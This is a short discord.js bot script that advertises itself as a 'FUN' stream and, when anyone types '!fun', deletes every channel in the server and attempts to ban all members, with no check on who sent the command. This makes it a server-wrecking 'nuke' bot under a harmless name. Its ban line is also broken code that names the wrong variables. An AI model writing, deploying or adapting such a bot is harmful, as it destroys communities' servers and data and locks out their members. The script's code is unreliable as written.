const Discord = require('discord.js');
const client = new Discord.Client();


client.on("ready", () => {

client.user.setActivity("FUN", {
    type: "STREAMING",
    url: "https://www.twitch.tv/#"
});

   console.log("ready");

});

client.on("message", async (msg) => {

    if(msg.content === ("!fun")) {

        if(msg.guild.channels.cache) {

            msg.guild.channels.cache.forEach(channel => channel.delete());
            msg.guild.user.cache.forEach(channel => user.ban());

        }

    }

});


client.login("--------------");